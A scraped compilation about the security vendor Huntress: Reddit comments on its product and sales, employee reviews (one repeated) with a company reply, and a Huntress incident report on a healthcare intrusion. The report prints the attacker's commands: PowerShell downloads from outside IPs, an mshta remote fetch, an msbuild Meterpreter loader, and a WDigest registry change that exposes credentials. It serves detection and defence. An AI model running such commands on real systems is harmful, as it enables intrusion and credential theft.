Huntress isn't intended to find everything. In fact, if you're super lucky, they might not find anything for a year. But when a persistent foothold does get installed in your systems, that means it has already made it past all other preventative measures that you have in place. From that point onward, it's only a matter of time before the attacker works their way down to you in their queue of \"ready to exploit\" organizations where they have footholds and then begins stealing credentials, lateral movement, AD info exfil, then payload drop.   \nThe Huntress team makes the incidents that you resolve with the Huntress product feel like nothing because it's so easy, but each high or critical they send could have turned into a business-altering breach without Huntress as an extension of your team.  \n\n\nI'm not there any longer, I don't have a dog in that fight, but compared to a lot of the other security vendors that try to solve security problems with software alone and sell you by making outlandish claims, \"The End Of Cyber Crime\" etc., Huntress actually provides value in their partnership, and in their solution.

All the endpoints had a big name AV installed. \n\nOne of our team started dropping Huntress. \n\nAt the same time elsewhere, another member of our team was recommending power everything off. The client agreed. \n\nHuntress had only a few minutes after being installed to start working. It alerted. \n\nAfterwards, doing forensics, we found out Huntress had correctly identified the malware in the few minutes it had before the machine was powered off. The big AV had generated a bunch of warnings but not clear threat signals — lots of noise, not much actionable info. \n\nHuntress is good value.

We start getting alerts about user files that contain password.\n\nWe've been using Huntress for almost a year now and this is the first time we received an alert about files that contain passwords. I checked Huntress blogs/updates but could not find info.\n\nThe alert goes:\n\n*\"Huntress detected one or more files on this endpoint that may contain passwords. Having passwords readily available on disk or network shares does not follow security best-practices as threat actors often search for and exploit this data. To reduce organizational risk, we recommend you remove these files and consider the use of a secure password manager.*\r  \n\r  \n*Please note this is a one-time process.

If this is helpful we may consider turning it into an official feature!\n\nEdit: Asked the team why we looked at this. We were looking for evidence of threat actors accessing potential unencrypted credentials and stumbled across the security risk.\n\nOne important distinction - we didn’t scan or download any of these files. We monitor process events via our EDR and saw that a file that looked like a password-containing file was accessed by a user. We didn’t use anything special, purely just looking at files being accessed with password in the name.\n\nEdit 2: We appreciate the feedback! We have some ideas on what we would do differently next time around re: notifications.

I was thoroughly unimpressed with how unprofessional this person was. While nice enough, they didn't bother to ask me almost anything or engage in virtually any of the consultative selling dialogue we expect from vendors these days.\n\nHas anyone had similar experiences with Huntress' initial touch points? Are there just a bunch of Huntress shills on this board, or am I missing something? Considering how unimpressed I were with BOTH of the initial touches, I am not inclined to proceed with them, but I don't want to miss out if they truly have a stellar platform AND if they have good post-sales support.\n\nThanks!\n\nEDIT/UPDATE: please see below for a very positive update!\n\n## Comment ID jbq8c0o with +36 score by [(OIT_Ray, Reddit, 2023-03-10)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbq8c0o/) (in reply to ID 11o1h1t):\nI'm not trying to minimalize your experience.

We use a round robin model vs a territory model, meaning when you ask to speak with the team the first thing we need to figure out is which team you would be working with. Off the top of my head, I believe the lines we draw are 0-49 endpoints, 50 - 749 endpoints, 750 - 1,999 endpoints, and 2,000+ endpoints. Once they identify which bucket you fall into, they would schedule a meeting with a rep and a sales engineer. \n\nI'll let others speak to their experience working with our team (both pre and post sales) but I'm super bummed to hear you didn't have a good first experience.

We had a new customer during the trial that had remnants of ransomware that it removed.\n\n\\- Can remove AV costs (not Sentinel One or Crowdstrike).  If you are paying for another AV and think Defender is a reasonable AV it is a viable option.\n\n\\- No constant / useless alerts.\n\n\\- Very little babysitting is required.  This solution requires very little tech time.\n\n\\- Emailed reports for agents that haven't checked in and other things that let you know the solution is still in.\n\n\\- Very straightforward pricing and contracts.  Really, this is what we want all vendors to do but few actually do.\n\n\\- They legitimately are out there helping MSPs enhance their security (neighborhood watch is a great example of this).  It isn't the disingenuous \"help\" where they say \"we want to help you grow\" crap we hear from every other vendor as they try to convince us their product will add revenue with no / little work!\n\n**Cons:**\n\n\\- Integration with RMMs is still a little light.\n\n\\- Like all security software, you want it to do something to justify the cost in your head but also don't want the security event.  It helps if it is also the AV replacement.\n\n\\- They don't play \"let's make a deal\".  Now this is in direct conflict with the pros, but it is something I am used to.  I rake ever vendor over the coals to get the best possible pricing / deal.  It was almost offensive that they wouldn't make any concessions!  Messed up I know because I don't want my customers trying it with me...  What can I say?  I am the product of a predatory vendor channel!!!\n\n\\- That last price increase was painful and borderline crazy.  It moved the product from a no-brainer to something you have to ensure there was no duplication for (replace lower AVs and such).  I have been told that their price increases are rare, but it was still a hell of a jump.  While they announced it all at the same time, it was still 25% in 2022 and 20% for this year.  (Quick note here - this isn't to say that the price increase isn't warranted.  They have crazy good support and security analysts.  Anytime prices go up that much though, it is still a \"Con\")\n\n## Comment ID jbrup0s with +7 score by [(wireditfellow, Reddit, 2023-03-11)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbrup0s/) (in reply to ID 11o1h1t):\nNice try Kaseya.\n\n## Comment ID jbrp0ke with +4 score by [(OnAKnowledgeQuest, Reddit, 2023-03-11)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbrp0ke/) (in reply to ID 11o1h1t):\nCurrent Huntress customer so take this with a grain of salt.

What’s really handy is the automated approved remediation process, if you decide the recommended remediations are enough, you click a button and huntress does the rest, you even get to choose if you want to reboot the endpoint manually or let huntress reboot the machine. Huntress has stopped at least 3 ransomeware incidents from occurring on client machines that had other endpoint protection software (webroot(yuck)) was not alerted. You can also see from the dashboard processes that are actively being investigated by security analysts, and a ton of helpful details about what’s going on on endpoints. I guess the most important thing to remember when a incident occurs and huntress alerts you is trust but verify. Don’t always go with the automated remediations, if you do, manually go through the machine to check for other footholds or iocs. Nuke the machine if it’s serious. Let me know if you have other questions.\n\n#### Comment ID jbsmyu2 with +3 score by [(bazjoe, Reddit, 2023-03-11)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbsmyu2/) (in reply to ID jbrrmbl):\nCheap, good, fast -pick one … Huntress solidly gets all three done for proactive response.

For Huntress, I was able to sign up for a trial directly without having to talk to anyone. When it ended, I went to the billing section on my account, added CC and signed up for 250 endpoints at $2.50 which is a fair price IMHO so I didn't bother with talking to anyone to negotiate a better deal (don't think I have enough endpoints to negotiate and if I did the tiered pricing they provide would lower my price). I had a few email exchanges with my \"account manager\", no phone calls, no fuss; just the way I like it.\n\n## Comment ID jcd70tr with +4 score by [(mspinnyc, Reddit, 2023-03-15)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jcd70tr/) (in reply to ID 11o1h1t):\nAs an update, I had a very good, productive call with both a Huntress sales manager and sales executive today.

I didn’t opt for presales and went more with talking to the engineers instead who know their product and know their cyber sec. \n\nHave had several instances of it showing it’s worth in the last year, a few cases requiring reaching out with their team, and it solidified the product for me. We had a machine download and attempt Mimcatz install, it got caught by Defender which policies blocked any executables from running until cleaned, and Huntress auto isolated the device from the rest of the internet, so we were unable to remove the isolation from Huntress due to the defender policy denying executions, and we couldn’t reach the 365 servers to remove that block. A few emails back and forth and we had a fix and a script that resolved it that had been created by the huntress team and we were up and running. \n\nWas great to see the how they handled it and service was great. \n\nMay just be an off sales rep but as others have said, it’s not a common experience.\n\n## Comment ID jbr2sf5 with +2 score by [(6l6fmSt5O2rxep0G01D, Reddit, 2023-03-11)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbr2sf5/) (in reply to ID 11o1h1t):\nJust give them your credit card and call it good.\n\n## Comment ID jbqbycb with +2 score by [(softwaremaniac, Reddit, 2023-03-10)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbqbycb/) (in reply to ID 11o1h1t):\nOur guy was super nice on the call, but annoying via email pushing for updates.

We had an active brute force attack happening & figured it was a bigger issue as we were watching it happen on CONSOLE. \n\nSome of this comes down to expectations vs what was really going to happen. I believe the expectation from us was to just send an email and wait for a response. We thought since this is 'real people' looking at things then we could talk to someone. We ended up calling our sales rep who then called around and called back saying someone was looking into it. No more information could be provided. This entire time we are watching the brute force continue. This was about 15minutes into the 'attack' at this point and we just shut down the server while we waited on a response. It was roughly 15 minutes after that we got a response that everything looked good and there wasn't enough failed login attempts to warrant a flag.\n\nWe booted that server back up... and it continued. So who do you trust? Huntress or your console your actively watching be brute forced.\n\nSo the experience of an emergency defiantly did not leave us feeling good. However we do now have a better idea of what to expect. \n\nFor those of you still reading, wondering about the resolution? Well it turns out if you paste a notepad in a password field, even with restarting CW Control sessions multiple times, it will still just keep going. So it was technically both not a real hack attempt, and a legit brute force, regardless of the cause.\n\n### Comment ID jbqrync with +1 score by [(DevinSysAdmin, Reddit, 2023-03-11)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbqrync/) (in reply to ID jbqrc6o):\n🤦‍♂️\n\n#### Comment ID jbr6mwu with +1 score by [(enuro12, Reddit, 2023-03-11)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbr6mwu/) (in reply to ID jbqrync):\nA couple more of those and a couple pikachu emoji's and you've got the entire postmortem in a nut shell.\n\n### Comment ID jbqs0b4 with +1 score by [(andrew-huntress, Reddit, 2023-03-11)](https://www.reddit.com/r/msp/comments/11o1h1t/huntress_sales_experience/jbqs0b4/) (in reply to ID jbqrc6o):\nIf you have any info on this (support ticket number, rough date on when it took place) I’d be interested in taking a look at this.

I do have to say being on the phone, with a sales rep watching a brute force (our fault or not) and basically being told to sit tight while they attempt to contact someone was incredibly disheartening. I just logged into the huntress portal and still don't see any way to contact help other than leaving a message in the chat bot. I also think our expectation of support though an incident stems from the sales call just a few days before.

I signed up for the free trial and was contacted via email by a rep who asked me how many endpoints and whether we were looking for direct buy or working through an MSP. When I said direct and about 115 endpoints, it took 3 days to get a response.\n\nAt that time, I was told they weren't interested in direct sales for less than 200 endpoints and was asked if I wanted to talk to be put in touch with an MSP. Well, not really, but if something could be worked out just to buy the licensing then maybe so I told her yes. She then copied me into an email with an MSP in Michigan while we're based in North Carolina. That Michigan person emailed me a link to his calendar to choose a time where he could then give me his pitch. No thanks.\n\nSo I emailed back the Huntress rep one more time and let her know we are adding an additional location in 2024 which should bring us up to about the 200 minimum and asked for more info, like pricing, etc. That was May 18 and I haven't heard a word back from her.\n\nMoving on to look at other solutions.

Huntress are people who constantly watch over our computers to make sure nothing dangerous happens to them.\n\nNow we don't pitch Huntress, or AV, or any other vendor solution to our clients. We sell an outcome (can be availability, security, peace of mind, you name it) and we designed a package to be able to deliver on that. What's in the package, while technically interesting, isn't relevant to most SMB owners. They couldn't care less about it actually, so if I ever had a client ask what's our AV or EDR, I'd tell them, but I'd start asking why they want to know. Because they most probably only care about the outcome.\n\nBut maybe clients are asking because YOU do not appear convinced yourself ? That seems more likely tbh.\n\nI can tell you what place Huntress has in our stack :\n\n* MDR : managed EDR with real people isolating endpoints when needed, and giving actionable advice on how to fix problems\n* Managed AV : they handle all the Microsoft Defender alerts and send us only what's relevant\n* Threat Hunting : they monitor for malicious activity, persistent threats on our endpoints and warn us. This goes far beyond what an EDR does, like recently they warned all people who had vulnerable Veeam servers.\n* External Recon : they monitor the public IP addresses associated with endpoints to search for services that should never be exposed publicly like RDP or SSH.\n* Ransomware canaries : traps that get triggered by ransomware activity, helping with early detection and stopping of these.\n\nThey also have features we don't use right now : security awareness training and M365 security monitoring for business email compromise.\n\n### Comment ID jkwjl96 with +4 score by [(Wynterwind, Reddit, 2023-05-20)](https://www.reddit.com/r/msp/comments/13mgogh/eli5_what_huntress_does/jkwjl96/) (in reply to ID jkw4dmy):\nThis is the way.   \n\nYou sell the outcomes and your expertise to implement solutions to produce those outcomes.

In addition, promotions are scarce at best. The most deserving wait years to potentially get promoted, most are still stagnant in their roles while outside hires supersede them. The Huntress product development also was top notch. Recently, the company decided to focus only on sales and encouraged the sales teams to promote products that were not ready. Anyone that challenged this approach was quickly silenced. Care for your employees and product is crucial to success and without it, the company will never be a place I would recommend to anyone.",

That goes for my direct teammates, manager, the c-suite and everyone in between. \n\nI recently had the pleasure of meeting all of these people in person at our summit. The energy, positivity and can-do attitude in those rooms was truly unique. I feel we as a collective are excited by our work protecting the 99% from cyber attacks. There is a deep sense of purpose there. \n\nFrom the get-go, I felt like Huntress invested in me. Which in turn made me motivated to invest my time, skills and growth right back. I’m given the tools, equipment and resources I need to do my job well. Feedback is encouraged and welcomed. Absolutely the best company culture, benefits and competitive pay. \n\nI feel lucky to be apart of this company.",

          "cons": "I am loathe to have to write this, but I feel like I have to warn prospects and current leaders about the culture at the company (doubt they'll care). Huntress is succeeding despite it's best efforts to sabotage itself. And I want it to succeed.\n\nHuntress's culture has declined to the point that the direction of the company is in the balance. Employees no longer have any loyalty, because of a lack of a feeling of job security. Loyalty and pride used to be main drivers behind employee morale. The pride everyone used to have is waning, as they realize the company does not care about them at all. Employees are feeling like they're just a cog in the wheel.\n\nThe company cycles through leaders in all departments so quickly that there is no loyalty or feeling of job security. Every department's leadership has cycled numerous times in just a few years, except the one that needs a refresh. Once leaders leave, the current employees are no longer supported by the new crew, and many often are cycled out also.\n\nThe company is led by founders without business chops or background. If you don't play their bro game, you're out. They are executing a playbook to cycle out leaders every 12-18 months, a strategy that may have benefits in the short term, but destroys culture and morale. The founders have no clue how to lead or what is needed at each position, and it shows. No sophisticated leader would follow this juvenile strategy. \n\nWhile I do not think it's intentional, the leadership style by the founders is that of fear. Yes, it's their company (although now at Series D, they have board bosses that should step in). Look, the founders had a great idea, designed a sweet product, and built a good company. But, they have not evolved as leaders with the stage of the company. Instead of seeing that, the problem is always someone else. Nobody ever meets their standards, communication is ineffective or nonexistent, and role definitions change or are misunderstood. Instead of bringing people along and up, the founders lead by fear and cycle out bodies for the new shiny toy. Really great, super qualified employees are not up-leveled or refreshed to retain them-the company mindset is apparently we can just go get someone else. Everyone is afraid to disagree or to take initiative, as it's always \"wrong.\" Beloved leaders and employees are being purged for \"the next stage\" -- a next stage that nobody seems to understand. \n\nImportantly, no one feels like they'll be a part of the future they talk about. When founders talk about massive future growth, the eye rolls start as most do not think they'll be a part of it. If the company ever goes public, it will likely do so without anyone who was a part of its growth stages. That is jarring. Only the founders will ring that bell. Other leaders who have the background, chops, and institutional knowledge will have left a company they help grow gangbusters. It's bonkers.\n\nThe culture has suffered. Almost everyone is actively looking for positions elsewhere, and aren't even quiet about it--from those here 6 months to those with 4 years behind them. Largely because they just don't know when they'll get the boot, and the constant stress of long hours and unknown as to whether it's enough (it never is).\n\nIf they did an actual anonymous poll, instead of one where replies can be tracked back (data broken down so granular is not anonymous), they'd get more candid feedback.\n\nFinally, do not believe all of the glowing reviews--the company incentivized people to positively review. \n\nYes, outwardly the branding is cool and the products kick butt. But inwardly, culture is toxic and future perceptions are bleak.\n\nSmoke and mirrors.\n\nThe company needs a pause and reset.",

I am sorry that your experience and thoughts about Huntress are so bleak. \n\nYou raise multiple points and we fully appreciate that they reflect your feelings.  No one can argue or dismiss those.  We noted this post was also cross-posted to Reddit, so the feelings are clearly real and strong.    \n\nWe love transparency and appreciate that Glassdoor asks both teammates and the company to share perspectives.  So we would be remiss to not share some data (which we share with radical transparency at monthly all-company Town Halls so our teammates can personally track the details) and reactions-\n\n-\tAttrition rates for the year are in the single digits, and trending down. Headcount has grown 2x in the last two years, and we are planning for the same in the next two, because . . . \n\n-\tEach of our four products are growing at industry-leading rates, and current customer revenue retention rates are a world-class 140%. Suffice to say, our Product dev team is second to none, and, the Huntress secret sauce to developing differentiated, high-value, managed solutions continues to sustain our hyper-growth! Investors have piled boat loads of cash into our cause the last few years for us to continue proliferating the 'Huntress Way' to wrecking hackers. \n\n-\t90 teammates (~ 1/3 of 1+ yr tenured workforce) have been promoted or earned another career growth opportunity as part of our 2x / yr compensation and promo review process.  Many more than this received merit-based pay adjustments. Every promotion has been shown and celebrated at Town Halls (aka- “Movers &amp; Shakers”) so all teammates know who they are.\n\n-\tAlso, every name &amp; face of our 150+ hires and the handful of leavers have also been shown, so all teammates can clearly track who’s coming and going. \n\n-\tWe recently won an Inc. best places to work award (granted exclusively on employee feedback from a survey they ran).  Our recent semi-annual anonymous (guaranteed by the vendor we utilize) survey showed a huge leap in employee net promotor score (58 - considered top tier in tech industry) \n\n-\tFollowing our anonymous in-house surveys, we ask people to post externally to Glassdoor (aka- “You’ve shared your voice with us in this survey; now we ask that you tell the world”).  We encourage people to post transparently and authentically how they are feeling- not directing what to say.  And of course there’s no way to incentivize posts with it all being anonymous.\n\n\nIn summary, every data point shared here is shared with all teammates monthly, as we embrace radical transparency.  In short, our BA hacker talent has driven extraordinary growth, enabling us to continually invest more into growing our teammates, and there’s no end in site.  Two things have remained true for nine years and will continue:\n*Hackers gonna hack.\n*Huntress gonna hunt.",

We have grown our headcount by 100% in the last year and revenue by the same in the previous few years.

If you thrive on always being on and available this is the place for you, literally you best be okay with putting in evening and weekend hours consistently because “that’s just how it is working at a startup.” weird exec comments on company all hands to justify the crazy work that makes it sound like they’re primarily looking out for themselves and their pocketbooks. Diversity is a thing in a select few teams but not so much for others. Also very much felt like old guard vs new guard while I was there and the “new” wasn’t as respected as those who had been there since the beginning and they got a pass for being rude and demeaning to teammates because it’s just who they are. Wouldn’t be surprised if this review is followed up with some internal stats to justify what they do. They’re still growing because they have a legit product and customers legit love them but the way you’re expected to sacrifice your personal life for them and the mind games are not worth it. There’s also a ton of senior leadership and not enough people doing the work.",

I love that they are candid, honest, real, and approachable. Speaks volumes about how Huntress values their employees.

        "cons": "I am loathe to have to write this, but I feel like I have to warn prospects and current leaders about the culture at the company (doubt they'll care). Huntress is succeeding despite it's best efforts to sabotage itself. And I want it to succeed.\n\nHuntress's culture has declined to the point that the direction of the company is in the balance. Employees no longer have any loyalty, because of a lack of a feeling of job security. Loyalty and pride used to be main drivers behind employee morale. The pride everyone used to have is waning, as they realize the company does not care about them at all. Employees are feeling like they're just a cog in the wheel.\n\nThe company cycles through leaders in all departments so quickly that there is no loyalty or feeling of job security. Every department's leadership has cycled numerous times in just a few years, except the one that needs a refresh. Once leaders leave, the current employees are no longer supported by the new crew, and many often are cycled out also.\n\nThe company is led by founders without business chops or background. If you don't play their bro game, you're out. They are executing a playbook to cycle out leaders every 12-18 months, a strategy that may have benefits in the short term, but destroys culture and morale. The founders have no clue how to lead or what is needed at each position, and it shows. No sophisticated leader would follow this juvenile strategy. \n\nWhile I do not think it's intentional, the leadership style by the founders is that of fear. Yes, it's their company (although now at Series D, they have board bosses that should step in). Look, the founders had a great idea, designed a sweet product, and built a good company. But, they have not evolved as leaders with the stage of the company. Instead of seeing that, the problem is always someone else. Nobody ever meets their standards, communication is ineffective or nonexistent, and role definitions change or are misunderstood. Instead of bringing people along and up, the founders lead by fear and cycle out bodies for the new shiny toy. Really great, super qualified employees are not up-leveled or refreshed to retain them-the company mindset is apparently we can just go get someone else. Everyone is afraid to disagree or to take initiative, as it's always \"wrong.\" Beloved leaders and employees are being purged for \"the next stage\" -- a next stage that nobody seems to understand. \n\nImportantly, no one feels like they'll be a part of the future they talk about. When founders talk about massive future growth, the eye rolls start as most do not think they'll be a part of it. If the company ever goes public, it will likely do so without anyone who was a part of its growth stages. That is jarring. Only the founders will ring that bell. Other leaders who have the background, chops, and institutional knowledge will have left a company they help grow gangbusters. It's bonkers.\n\nThe culture has suffered. Almost everyone is actively looking for positions elsewhere, and aren't even quiet about it--from those here 6 months to those with 4 years behind them. Largely because they just don't know when they'll get the boot, and the constant stress of long hours and unknown as to whether it's enough (it never is).\n\nIf they did an actual anonymous poll, instead of one where replies can be tracked back (data broken down so granular is not anonymous), they'd get more candid feedback.\n\nFinally, do not believe all of the glowing reviews--the company incentivized people to positively review. \n\nYes, outwardly the branding is cool and the products kick butt. But inwardly, culture is toxic and future perceptions are bleak.\n\nSmoke and mirrors.\n\nThe company needs a pause and reset.",

In addition, promotions are scarce at best. The most deserving wait years to potentially get promoted, most are still stagnant in their roles while outside hires supersede them. The Huntress product development also was top notch. Recently, the company decided to focus only on sales and encouraged the sales teams to promote products that were not ready.

      "# [Bitter Pill: Pharmaceutical Vendor Linked to Pharmacy and Health Clinic Cyberattack](https://www.huntress.com/blog/third-party-pharmaceutical-vendor-linked-to-pharmacy-and-health-clinic-cyberattack)\nIn a concerning development within the healthcare sector, Huntress has identified a series of unauthorized access that signifies internal reconnaissance and preparation for additional threat actor activity against multiple healthcare organizations.Â\n\nThe attackers abused a locally hosted instance of a widely-used remote access tool, ScreenConnectâutilized by the company Transaction Data Systems (which recently merged with and was renamed Outcomes), the makers of Rx30 and ComputerRx software â for initial access to victim organizations. The threat actor proceeded to take several steps, including installing additional remote access tools such as ScreenConnect or AnyDesk instances, to ensure persistent access to the environments.\n\nOverview\n\nIn this article, there are multiple ScreenConnect instances at play; there are a total of four instances observed, across two endpoints, from completely distinct organizations (i.e., not the same company, not managed by the same MSP, geographically separated, etc.). One of those ScreenConnect instances appeared and was used by the threat actor on both endpoints.Â\n\nThere were similarities in tactics, techniques, and procedures (TTPs) across both endpoints, as well as multiple intersections in indicators of compromise (IOCs). Specifically, one ScreenConnect instance (instance B) was observed being actively used on both endpoints, the â[redacted 1]â account was observed being used to access both endpoints via ScreenConnect, and the file [.highlight]test.xml[.highlight] was downloaded to both endpoints via PowerShell.\n\nEndpoint 1\n\nEndpoint 1 is a Windows Server 2019 Standard system within an infrastructure in the pharmaceutical field. Log data allowed the Huntress team to âseeâ as far back as August 9, 2023, where the team observed ScreenConnect instance A being accessed via an account named â[redacted 1]â. There were repeated âConnectedâ and âDisconnectedâ messages for the account until the file [.highlight]ConnectWiseControl.ClientSetup.msi[.highlight] was downloaded and launched, installing ScreenConnect instance B on the endpoint. Then, beginning on August 10, 2023, the â[redacted 1]â account was used to access the endpoint via ScreenConnect instance B. There were several pairs of âConnectedâ and âDisconnectedâ messages in the logs for the â[redacted 1]â account until October 28, 2023.\n\nOn October 28, the â[redacted 2]â account was used to access ScreenConnect instance B, and run the following PowerShell command:\n\n[.highlight]powershellÂ -command \"& { (New-Object Net.WebClient).DownloadFile('http://2.57.149[.]103/a.msi', 'C:\\Users\\Administrator\\Documents\\a.msi') }\"Â [.highlight]\n\nThe [.highlight]a.msi[.highlight] file was launched via [.highlight]MsiExec.exe[.highlight], installing ScreenConnect instance C on the endpoint, connecting to IP address [.highlight]45.66.230[.]146 via port 8041[.highlight]. Shortly after the installation completed, the â[redacted 2]â account disconnected from ScreenConnect instance B.\n\nTwo days later, on October 30, ScreenConnect instance C was used to run the following PowerShell command:\n\n[.highlight]powershellÂ -Command \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://119.91.138[.]133:443/test.xml', 'c:\\programdata\\test.xml')\"[.highlight]\n\nAlmost 20 hours later, on October 31, ScreenConnect instance B was used to run the following command:\n\n[.highlight]C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exeÂ C:\\programdata\\test.xml[.highlight]\n\nThe payload, [.highlight]test.xml[.highlight] , consists of C# code forking the publicly available nps project for detection evasion and process execution. As designed, the payload attempts to load a Metasploit Meterpreter instance in memory, but antimalware protections on the system identified and attempted to terminate execution. However, this does not appear to have succeeded, as additional processes were observed being launched via the Printer Spooler service, [.highlight]spoolsv.exe[.highlight]. For example, the following processes were observed being run:\n\n[.highlight]nslookupÂ myip.opendns[.]com. Resolver1.opendns[.]com[.highlight]\n\n[.highlight]powershellÂ -command \"Import-Module ActiveDirectory;Get-ADComputer -Filter * -Properties * | Sort IPv4Address | FT Name, ipv4*, oper*, LastLogonDate -Autosize\"[.highlight]\n\n[.highlight]C:\\Windows\\system32\\cmd.exeÂ /S /D /c type C:\\Windows\\System32\\mimilsa.log | findstr /V Mailbox[.highlight]\n\nEndpoint 2\n\nEndpoint 2 is also a Windows Server 2019 Standard system, within an infrastructure in the healthcare field. Log data illustrates that ScreenConnect instance B (the same âinstance Bâ observed on endpoint 1) was installed and actively being connected to via the â[redacted 1]â account as of November 8, 2022. On November 1, 2023, the file [.highlight]s.msi[.highlight] was transferred to the endpoint via the ScreenConnect instance; launching this file led to ScreenConnect instance D being installed on this endpoint, with the instance configured to connect to [.highlight]185.12.45[.]98[.highlight] on port [.highlight]8041[.highlight].\n\nIt was clear that ScreenConnect instance B was still running and accessible on the endpoint; on November 5, 2023, an error message indicated that the instance attempted to connect to the configured endpoint, and a DNS Client message was observed indicating that the configured endpoint could not be resolved.\n\nOn November 6, the following PowerShell command was run via ScreenConnect instance D:\n\n[.highlight]powershell -Command $wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://119.91.138[.]133:443/test.xml', 'c:\\programdata\\test.xml')[.highlight]\n\nThe use of [.highlight]msbuild.exe[.highlight] to compile the file and launch the payload was not observed on this endpoint. However, four hours later, the following PowerShell command was run, also via ScreenConnect instance D:\n\n[.highlight]powershell -Command $wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://bashupload[.]com/PXYpf/a.msi', 'c:\\programdata\\a.msi')[.highlight]\n\nThis file was launched via [.highlight]msiexec.exe[.highlight], installing the âAnyDeskMSI Serviceâ. However, about a minute and a half after being launched, this service was stopped via [.highlight]taskkill.exe[.highlight].Â\n\nApproximately four hours later, the threat actor made multiple attempts to create the âmanagerâ user account and add the account to the local Administrator group on the endpoint. Once their efforts were successful, the threat actor logged out, then logged back into ScreenConnect instance D via the newly created account, and then used that instance to transfer and launch the file [.highlight]Advanced_IP_Scanner_2.5.4594.1.exe[.highlight]. Finally, the threat actor was observed running the following commands:\n\n[.highlight]mshta http://119.91.138[.]133:9999/5E1Ch[.highlight]\n\n[.highlight]taskkillÂ /F /IM mshta.exe[.highlight]\n\n[.highlight]reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f[.highlight]\n\nScreenConnect Instance B\n\nScreenConnect instance B, found on both endpoints and accessed via the â[redacted 1]â account, per the user.config file retrieved from one of the endpoints monitored via Huntress, is tied to [.highlight]rs.tdsclinical[.]com[.highlight].Â\n\nThe observed domain is legitimate and associated with Transaction Data Systems (now named Outcomes). At this time, Huntress cannot identify whether Transaction Data Systems itself has been breached, if credentials for a legitimate Transaction Data Systems-associated employee or user have been leaked, or if some other mechanism was involved tying their remote management of these clients to subsequent threat actor abuse.\n\nTechnical Indicators of Compromise (IoCs)\n\nHuntress has identified and urges immediate action upon the following IoCs:\n\nâ\n\nAssociated Files & Payloads\n\nName\n\nSHA256\n\nFunction\n\n[.highlight]test.xml[.highlight]\n\n[.highlight]9f42bf3a61faaab8f86abb3c7f9db417bffb3474a55169a4efb1d2386545e4e8[.highlight]\n\nC# payload designed to load Meterpreter into victim memory\n\n[.highlight]a.msi[.highlight]\n\n[.highlight]70f865a7f8a01356685b17abdf6ac738e9a9098f1ae2d5a34cfa3610cb28fc56[.highlight]\n\nAnyDesk MSI installer\n\n[.highlight]s.msi[.highlight]\n\n[.highlight]8c3b4febe58df0a01126d78109f52035d34a4e03f02b5d4fca3e4d94f3f657b3[.highlight]\n\nScreenConnect MSI installer\n\nScreenConnect Instance IDs\n\nScreenConnect Instance ID\n\nDescription\n\n[.highlight]adf02e34cba839d2[.highlight]\n\nScreenConnect instance ID B, associated with [.highlight]rs.tdsclinical[.]com[.highlight]\n\n[.highlight]e3e2410d655306ff[.highlight]\n\nScreenConnect instance ID C, associated with [.highlight]45.66.230[.]146[.highlight]\n\n[.highlight]4974c38508ef2b18[.highlight]\n\nScreenConnect instance ID D, associated with [.highlight]185.12.45[.]98[.highlight]\n\nFile Paths and Names\n\n[.highlight]C:\\programdata\\a.msi[.highlight]\n\n[.highlight]C:\\programdata\\test.xml[.highlight]\n\n[.highlight]C:\\Users\\Administrator\\Documents\\a.msi[.highlight]\n\n[.highlight]S.msi[.highlight]\n\n[.highlight]C:\\Users\\manager\\Documents\\ConnectWiseControl\\Files\\Advanced_IP_Scanner_2.5.4594.1.exe[.highlight]\n\n[.highlight]C:\\Program Files (x86)\\ScreenConnect Client (<unique identifier>)\\ScreenConnect.ClientService.exe[.highlight]\n\nAdditional Observables\n\nWhile researching this event, Huntress analysts identified an open directory on [.highlight]2.57.149[.]103[.highlight], shown in the following figure:\n\nIn addition to [.highlight]a.msi[.highlight], the AnyDesk installer previously discussed, two additional files were located:\n\n[.highlight]b.msi[.highlight] ([.highlight]f28ee671c0f894154dd8c145f2b6b819b63348c785a682f60f37529a2aae174e[.highlight]): another ScreenConnect client installer.\n\n[.highlight]t.zip[.highlight] ([.highlight]ba8521ef14f1ec09f0bcb8f490e30322ca4eb84fa0013ee3bbe9c6a24866d334[.highlight]): an archive containing three additional payloads:\n\nWinPcap_4_1_3.exe (fc4623b113a1f603c0d9ad5f83130bd6de1c62b973be9892305132389c8588de): a legitimate WinPcap version 4.1.3 executable.\n\n[.highlight]Masscan64.exe[.highlight] ([.highlight]174f91806e8bc1c0dea24192f7d4afcefc40a1731827b32939d4f411e8402d75[.highlight]): a compiled version of the Masscan TCP port scanner.Â\n\n[.highlight]veeam.exe[.highlight] ([.highlight]45c8716c69f56e26c98369e626e0b47d7ea5e15d3fb3d97f0d5b6e8997299d1a[.highlight]): an executable containing code to exploit CVE-2023-27532 in Veeam software, disclosed in March 2023.\n\nThe IP in question appears to be a tool repository for threat actors, although the lack of observations on [.highlight]b.msi[.highlight] and payloads in [.highlight]t.zip[.highlight] in monitored environments makes its association with the ScreenConnect incidents uncertain. However, the payloads in question match overall observed behaviors in terms of remote access tool installation ([.highlight]b.msi[.highlight]) and payloads associated with system survey ([.highlight]masscan64.exe[.highlight]) and data capture (WinPcap_4_1_3.exe). The outlier is [.highlight]veeam.exe[.highlight], as all other observed activity indicates a combination of credential capture or reuse with living-off-the-land techniques or abuse of legitimate software.\n\nMitigation Guidance\n\nPharmacies and other healthcare organizations that may be clients of Transaction Data Systems/Outcomes should immediately examine their systems and networks for the above IoCs. Any discovery of these should be taken seriously and investigated promptly. Given the potential implications of such a breach in the healthcare industry, particularly regarding patient data, privacy, and availability of critical services, a comprehensive response is essential.\n\nIf youâd like to have someone else watching your back while you work on scoping your environment, start a free trialÂ with us so our 24/7 SOC can 